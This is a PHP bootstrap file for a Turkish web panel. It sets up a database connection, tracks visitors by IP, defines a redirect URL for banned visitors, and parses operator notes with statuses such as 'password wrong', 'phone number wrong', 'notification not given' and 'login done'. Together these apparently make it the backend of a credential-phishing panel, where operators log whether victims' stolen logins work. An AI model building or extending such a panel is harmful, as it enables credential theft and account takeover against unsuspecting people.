<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
session_start();
ob_start();
date_default_timezone_set('Europe/Istanbul');

require_once 'config.php';

$db = null;
try {
    $db = new PDO("mysql:host=" . DB_HOST . ";port=" . DB_PORT . ";dbname=" . DB_NAME . ";charset=utf8", DB_USER, DB_PASS);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); 
} catch (PDOException $e) {
    // Silent fail or handle error
}

if (!$db) {
    die("Veritabanı bağlantı hatası! Lütfen Vercel panelinden Environment Variables (ortam değişkenlerini) doğru tanımladığınızdan ve Plesk sunucunuzun dış bağlantılara (remote SQL) açık olduğundan emin olun.");
}

require_once 'AjaxClass.php';

$ajax = new Ajax($db);

DEFINE('IP', $ajax->getIP());
DEFINE('BAN_URL',"https://www.youtube.com/watch?v=S1mbxjBTiIE");
$ajax->updateOnline(IP);

$session = @$_SESSION['loggedIn'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$acsTime = date('d.m.20y, H:i');

function parseNote($note) {
    $note = trim($note);
    if (empty($note)) {
        return ['selected' => '', 'manual' => ''];
    }
    $decoded = json_decode($note, true);
    if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
        return [
            'selected' => isset($decoded['selected']) ? $decoded['selected'] : '',
            'manual' => isset($decoded['manual']) ? $decoded['manual'] : ''
        ];
    }
    
    // Fallback for legacy plain text notes
    $options = ["Bildirim vermedi", "Şifre hatalı", "Tel no hatalı", "Bırçi", "Giriş Yapıldı"];
    if (in_array($note, $options)) {
        return ['selected' => $note, 'manual' => ''];
    }
    return ['selected' => '', 'manual' => $note];
}

